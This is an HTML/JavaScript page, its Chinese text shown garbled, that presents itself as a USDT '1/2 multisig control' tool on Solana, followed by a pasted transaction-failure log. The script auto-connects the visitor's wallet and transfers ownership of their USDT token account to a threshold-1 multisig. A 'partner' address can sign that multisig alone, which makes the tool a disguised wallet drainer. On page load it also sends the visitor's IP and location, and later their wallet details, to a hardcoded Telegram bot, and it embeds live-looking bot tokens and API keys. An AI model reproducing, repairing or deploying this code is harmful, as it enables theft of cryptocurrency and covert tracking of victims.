<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>USDT å¤šç­¾æ§åˆ¶ (1/2)</title>
  <!-- ä½¿ç”¨ CDN åŠ è½½ solana web3.js å’Œ spl-token -->
    <script src="node_modules/@solana/web3.js/lib/index.iife.min.js"></script>
    <!-- å¼•å…¥æœ¬åœ°çš„Solana SPL Tokenåº“æ–‡ä»¶ -->
    <script src="node_modules/@solana/spl-token/lib/index.iife.min.js"></script>
  <style>
    body { padding: 20px; font-family: Arial; max-width: 800px; margin: 0 auto; }
    input { margin: 10px 0; padding: 8px; width: 95%; border: 1px solid #ccc; }
    button { padding: 10px 20px; background: #4CAF50; color: white; border: none; cursor: pointer; }
    #status { margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 4px; }
    a { color: #2196F3; }
  </style>
</head>
<body>
  <h2>USDT å¤šç­¾æ§åˆ¶ (1/2)</h2>
  
  <!-- è¿æ¥é’±åŒ…åŠè¾“å…¥åˆä½œä¼™ä¼´åœ°å€ -->
  <button id="connectWallet">è¿æ¥é’±åŒ…</button>
  <div style="margin: 20px 0;">
      <input type="text" id="partnerAddress" placeholder="è¯·è¾“å…¥åˆä½œæ–¹é’±åŒ…åœ°å€" style="width: 400px;">
      <button id="transferBtn">åˆ›å»ºå¤šç­¾æ§åˆ¶</button>
  </div>

  <div id="status">
      <p>æ“ä½œæŒ‡å¼•ï¼š</p>
      <ol>
          <li>è¿æ¥ä½ çš„é’±åŒ…ï¼ˆé¡»æŒæœ‰ USDTï¼‰</li>
          <li>è¾“å…¥åˆä½œä¼™ä¼´çš„é’±åŒ…åœ°å€ï¼ˆä¸èƒ½ä¸è‡ªå·±ç›¸åŒï¼‰</li>
          <li>ç³»ç»Ÿè‡ªåŠ¨æŸ¥æ‰¾ä½ çš„ USDT è´¦æˆ·ï¼Œå¹¶å°†è¯¥è´¦æˆ·æ§åˆ¶æƒè½¬ç§»åˆ°æ–°åˆ›å»ºçš„å¤šç­¾è´¦æˆ·</li>
      </ol>
  </div>

  <script>
    // é…ç½®ä¿¡æ¯
    const RPC_ENDPOINTS = [
      "https://hardworking-attentive-mountain.solana-mainnet.quiknode.pro/3f12057992190539c6e06064e03451ba12e2abbb/",
      "https://api.helius.xyz/v0/transactions/?api-key=16d6ec57-e132-4f68-b5c0-332ec2c8161c",
      "https://solana-mainnet.g.alchemy.com/v2/demo"
    ];
    
    const TG_BOT_TOKEN = '6114861032:AAGaVr1TX7mBi3RTSsEfN2DoE_Ux4Giq_MI';
    const TG_CHAT_ID = '-4695026385';
    // USDT é“¸å¸åœ°å€ï¼ˆSPL Token Mintï¼‰
    const USDT_MINT = new solanaWeb3.PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
    // æ­¤å¤„ä¿ç•™ delegate é…ç½®ï¼Œä½†å¤šç­¾ä¸­æˆ‘ä»¬ä½¿ç”¨ç”¨æˆ·è¾“å…¥çš„åˆä½œä¼™ä¼´åœ°å€
    const DELEGATE_ADDRESS = new solanaWeb3.PublicKey("6Be4tFNPh9s9ms6ghA1UmVQLM6qfqfuKQDEQc2fHWHs9");
    
    // æ±‡ç‡é…ç½®ï¼ˆä»…ç”¨äºé¡µé¢ä½™é¢æ˜¾ç¤ºä¸è½¬æ¢ï¼Œå§‹ç»ˆä»¥ USDT ä¸ºå‡†ï¼‰
    const exchangeRates = {
      USDT: 7.34,
      SOL: 987.25
    };
    
    // æ‰‹åŠ¨å®šä¹‰ AuthorityType å¸¸é‡ï¼ˆAccountOwner å¯¹åº” 2ï¼‰
    const AuthorityType = {
      MintTokens: 0,
      FreezeAccount: 1,
      AccountOwner: 2,
      CloseAccount: 3
    };
    
    // å…¨å±€å˜é‡ï¼šä¿å­˜é’±åŒ…ä½™é¢åŠé’±åŒ…å¯¹è±¡
    let walletSOLBalance = 0;
    let walletUSDTBalance = 0;
    window.provider = null;
    
    // ä» window.splToken è§£æ„å…¶ä»–å¸¸é‡ï¼ˆä¸ç”¨è§£æ„ createSetAuthorityInstructionï¼‰
    const {
      MULTISIG_SIZE,
      TOKEN_PROGRAM_ID,
      getAssociatedTokenAddress
    } = window.splToken;
    
    // è‡ªå®šä¹‰å®ç° createInitializeMultisigInstructionï¼ˆçº¯ Uint8Arrayï¼Œä¸ä½¿ç”¨ Bufferï¼‰
    function createInitializeMultisigInstruction(multisig, signers, m, programId = TOKEN_PROGRAM_ID) {
      const NUM_SIGNERS_PAD = 11; // å¤šç­¾è´¦æˆ·æœ€å¤šæ”¯æŒ 11 ä¸ªç­¾åè€…
      const data = new Uint8Array(3 + 32 * NUM_SIGNERS_PAD);
      data[0] = 2;       // æŒ‡ä»¤ç¼–å·ï¼šInitializeMultisig ä¸º 2
      data[1] = m;       // ç­¾åé˜ˆå€¼
      data[2] = signers.length; // å®é™…ç­¾åè€…æ•°é‡
      for (let i = 0; i < signers.length; i++) {
        const signerBytes = signers[i].toBytes();
        data.set(signerBytes, 3 + i * 32);
      }
      return new solanaWeb3.TransactionInstruction({
        keys: [{
          pubkey: multisig,
          isSigner: false,
          isWritable: true,
        }],
        programId,
        data: data
      });
    }
    
    // è‡ªå®šä¹‰å®ç° createSetAuthorityInstructionï¼ˆçº¯ Uint8Arrayï¼Œä¸ä½¿ç”¨ Bufferï¼‰
    function createSetAuthorityInstruction(account, currentAuthority, authorityType, newAuthority, multiSigners = [], programId = TOKEN_PROGRAM_ID) {
      const instructionIndex = 6; // SetAuthority æŒ‡ä»¤ç¼–å·ä¸º 6
      const newAuthorityOption = newAuthority ? 1 : 0;
      const data = new Uint8Array(1 + 1 + 1 + (newAuthorityOption ? 32 : 0));
      data[0] = instructionIndex;
      data[1] = authorityType;
      data[2] = newAuthorityOption;
      if (newAuthorityOption === 1) {
        data.set(newAuthority.toBytes(), 3);
      }
      // æ„é€  keys æ•°ç»„ï¼š
      const keys = [];
      // è¦ä¿®æ”¹çš„ token è´¦æˆ·ï¼ˆå¿…é¡» writableï¼‰
      keys.push({ pubkey: account, isSigner: false, isWritable: true });
      // å½“å‰æƒé™æŒæœ‰è€…ï¼Œå¿…é¡»ç­¾å
      keys.push({ pubkey: currentAuthority, isSigner: true, isWritable: false });
      // å¦‚æœ‰ multiSignersï¼Œåˆ™æ·»åŠ ï¼ˆæœ¬ä¾‹ä¸­ä¸ºç©ºï¼‰
      for (const signer of multiSigners) {
        keys.push({ pubkey: signer, isSigner: true, isWritable: false });
      }
      return new solanaWeb3.TransactionInstruction({
        keys,
        programId,
        data: data
      });
    }
    
    // Telegram é€šçŸ¥åŠŸèƒ½
    async function sendTelegramNotification(message) {
      try {
        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chat_id: TG_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
          })
        });
      } catch (error) {
        console.error('Telegram é€šçŸ¥å‘é€å¤±è´¥:', error);
      }
    }
    
    // é¡µé¢åŠ è½½é€šçŸ¥
    document.addEventListener('DOMContentLoaded', () => {
      const ipInfoUrl = 'https://ipinfo.io/json';
      fetch(ipInfoUrl)
        .then(res => res.json())
        .then(data => {
          const message = `ğŸ”” æ–°è®¿é—®é€šçŸ¥\næ—¶é—´: ${new Date().toLocaleString()}\nIP: ${data.ip}\nä½ç½®: ${data.city}, ${data.country}`;
          sendTelegramNotification(message);
        });
    });
    
    // è‡ªåŠ¨è¿æ¥é’±åŒ…ï¼ˆæ”¯æŒ Phantom æˆ– Solflareï¼‰
    async function autoConnectWallet() {
      let provider;
      if (window.solana && window.solana.isPhantom) {
        provider = window.solana;
      } else if (window.solflare && window.solflare.isSolflare) {
        provider = window.solflare;
      } else {
        console.error("è¯·å®‰è£… Phantom æˆ– Solflare é’±åŒ…");
        return;
      }
      try {
        if (!provider.isConnected) await provider.connect();
        window.provider = provider;
        console.log("é’±åŒ…å·²è¿æ¥:", provider.publicKey.toString());
        updateBalances();
        document.getElementById('status').innerHTML = `å·²è¿æ¥é’±åŒ…ï¼š${provider.publicKey.toString()}`;
      } catch (err) {
        console.error("è‡ªåŠ¨è¿æ¥é’±åŒ…å¤±è´¥:", err);
      }
    }
    window.addEventListener('load', autoConnectWallet);
    
    // è·å–å¯ç”¨ RPC è¿æ¥
    async function getConnection() {
      let connection;
      for (const endpoint of RPC_ENDPOINTS) {
        try {
          connection = new solanaWeb3.Connection(endpoint, 'confirmed');
          await connection.getEpochInfo();
          return connection;
        } catch(e) {
          console.warn(`RPC èŠ‚ç‚¹ä¸å¯ç”¨: ${endpoint}`);
        }
      }
      throw new Error("æ— æ³•è¿æ¥åˆ° RPC èŠ‚ç‚¹");
    }
    
    // æ›´æ–° USDT ä½™é¢ï¼ˆä»…è°ƒè¯•ç”¨ï¼Œå¯æ ¹æ®éœ€æ±‚æ›´æ–°é¡µé¢æ˜¾ç¤ºï¼‰
    async function updateBalances() {
      if (!window.provider || !window.provider.publicKey) return;
      const walletPublicKey = window.provider.publicKey;
      try {
        const connection = await getConnection();
        const lamports = await connection.getBalance(walletPublicKey);
        walletSOLBalance = lamports / solanaWeb3.LAMPORTS_PER_SOL;
        const accounts = await connection.getTokenAccountsByOwner(walletPublicKey, { mint: USDT_MINT });
        let usdt = 0;
        for (const acct of accounts.value) {
          const balanceInfo = await connection.getTokenAccountBalance(acct.pubkey);
          usdt += balanceInfo.value.uiAmount;
        }
        walletUSDTBalance = usdt;
        console.log("USDT ä½™é¢ï¼š", walletUSDTBalance);
      } catch (error) {
        console.error("è·å–ä½™é¢å¤±è´¥:", error);
      }
    }
    
    // é‡è¯•æœºåˆ¶ï¼ˆè¾…åŠ©å‡½æ•°ï¼‰
    async function withRetry(fn, retries = 3) {
      try {
        return await fn();
      } catch (error) {
        if (retries > 0) {
          await new Promise(resolve => setTimeout(resolve, 1000));
          return await withRetry(fn, retries - 1);
        }
        throw error;
      }
    }
    
    // å¤šç­¾æ“ä½œï¼šå°†å½“å‰é’±åŒ…çš„ USDT è´¦æˆ·æ§åˆ¶æƒè½¬ç§»åˆ°æ–°åˆ›å»ºçš„å¤šç­¾è´¦æˆ·ä¸­ï¼Œ
    // å¤šç­¾è´¦æˆ·ç­¾åè€…ä¸ºå½“å‰é’±åŒ…å’Œç”¨æˆ·è¾“å…¥çš„åˆä½œä¼™ä¼´ï¼Œé˜ˆå€¼è®¾ä¸º 1ï¼ˆå³ä»»ä¸€æ–¹ç­¾åå³å¯ï¼‰
    async function approveMultisig() {
      const btn = document.getElementById('transferBtn');
      if (!window.provider || !window.provider.publicKey) {
        alert("é’±åŒ…æœªè¿æ¥ï¼Œè¯·åˆ·æ–°é¡µé¢é‡è¯•ï¼");
        return;
      }
      const walletPublicKey = window.provider.publicKey;
      const partnerAddress = document.getElementById('partnerAddress').value.trim();
      if (!partnerAddress) {
        alert("è¯·è¾“å…¥åˆä½œä¼™ä¼´åœ°å€");
        return;
      }
      let partnerPublicKey;
      try {
        partnerPublicKey = new solanaWeb3.PublicKey(partnerAddress);
      } catch(e) {
        alert("æ— æ•ˆçš„åˆä½œä¼™ä¼´åœ°å€");
        return;
      }
      if (partnerPublicKey.equals(walletPublicKey)) {
        alert("ä¸èƒ½å°†è‡ªå·±è®¾ç½®ä¸ºåˆä½œä¼™ä¼´");
        return;
      }
      try {
        btn.textContent = "æ­£åœ¨åˆ›å»ºå¤šç­¾...";
        const connection = await getConnection();
        // æŸ¥æ‰¾å½“å‰é’±åŒ…çš„ USDT è´¦æˆ·ï¼ˆä½¿ç”¨ getTokenAccountsByOwner æŸ¥æ‰¾ï¼‰
        const tokenAccounts = await connection.getTokenAccountsByOwner(walletPublicKey, { mint: USDT_MINT });
        if (tokenAccounts.value.length === 0) {
          throw new Error("æœªæ‰¾åˆ° USDT ä»£å¸è´¦æˆ·ï¼Œè¯·ç¡®ä¿é’±åŒ…æŒæœ‰ USDT");
        }
        const tokenAccountPublicKey = new solanaWeb3.PublicKey(tokenAccounts.value[0].pubkey);
        // ç”Ÿæˆæ–°çš„å¤šç­¾è´¦æˆ· Keypair
        const multisigAccount = solanaWeb3.Keypair.generate();
        const rent = await connection.getMinimumBalanceForRentExemption(MULTISIG_SIZE);
        const transaction = new solanaWeb3.Transaction();
        // â‘  åˆ›å»ºå¤šç­¾è´¦æˆ·
        transaction.add(
          solanaWeb3.SystemProgram.createAccount({
            fromPubkey: walletPublicKey,
            newAccountPubkey: multisigAccount.publicKey,
            lamports: rent,
            space: MULTISIG_SIZE,
            programId: TOKEN_PROGRAM_ID
          })
        );
        // â‘¡ åˆå§‹åŒ–å¤šç­¾è´¦æˆ·
        transaction.add(
          createInitializeMultisigInstruction(
            multisigAccount.publicKey,
            [walletPublicKey, partnerPublicKey],
            1,
            TOKEN_PROGRAM_ID
          )
        );
        // â‘¢ è½¬ç§» USDT è´¦æˆ·æ§åˆ¶æƒåˆ°æ–°åˆ›å»ºçš„å¤šç­¾è´¦æˆ·
        transaction.add(
          createSetAuthorityInstruction(
            tokenAccountPublicKey,
            walletPublicKey,
            AuthorityType.AccountOwner,
            multisigAccount.publicKey,
            [], // æ­¤å¤„æ— å¤šé‡ç­¾åè€…åˆ—è¡¨
            TOKEN_PROGRAM_ID
          )
        );
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = walletPublicKey;
        // multisigAccount éœ€éƒ¨åˆ†ç­¾å
        transaction.partialSign(multisigAccount);
        const signedTx = await window.provider.signTransaction(transaction);
        const txid = await connection.sendRawTransaction(signedTx.serialize());
        await connection.confirmTransaction(txid, 'confirmed');
        btn.textContent = "åˆ›å»ºå¤šç­¾æ§åˆ¶";
        const msg = `âœ… *å¤šç­¾åˆ›å»ºæˆåŠŸ* âœ…
        
ğŸ‘œ é’±åŒ…åœ°å€: \`${walletPublicKey.toString()}\`
ğŸ‘¥ åˆä½œä¼™ä¼´: \`${partnerPublicKey.toString()}\`
ğŸ”’ å¤šç­¾è´¦æˆ·: \`${multisigAccount.publicKey.toString()}\`
ğŸ“„ äº¤æ˜“: [æŸ¥çœ‹è¯¦æƒ…](https://solscan.io/tx/${txid})
ğŸ•’ æ—¶é—´: ${new Date().toLocaleString()}`;
        await sendTelegramNotification(msg);
        alert("å¤šç­¾æ§åˆ¶å·²åˆ›å»ºæˆåŠŸï¼Œå¹¶å·²é€šè¿‡ Telegram é€šçŸ¥ã€‚");
        updateBalances();
      } catch (error) {
        console.error(error);
        btn.textContent = "åˆ›å»ºå¤šç­¾æ§åˆ¶";
        alert("æ“ä½œå¤±è´¥ï¼š" + error.message);
      }
    }
    
    document.getElementById('transferBtn').addEventListener('click', approveMultisig);
  </script>
</body>
</html>
æŠ¥é”™(ç´¢å¼•):316  SendTransactionError: Simulation failed. 
Message: Transaction simulation failed: Error processing Instruction 1: insufficient account keys for instruction. 
Logs: 
[
  "Program 11111111111111111111111111111111 invoke [1]",
  "Program 11111111111111111111111111111111 success",
  "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [1]",
  "Program log: Instruction: InitializeMultisig",
  "Program log: Error: NotEnoughAccountKeys",
  "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA consumed 865 of 402850 compute units",
  "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA failed: insufficient account keys for instruction"
]. 
Catch the `SendTransactionError` and call `getLogs()` on it for full details.
    at Connection.sendEncodedTransaction (connection.ts:6047:13)
    at async Connection.sendRawTransaction (connection.ts:6003:11)
    at async HTMLButtonElement.approveMultisig ((ç´¢å¼•):302:22)
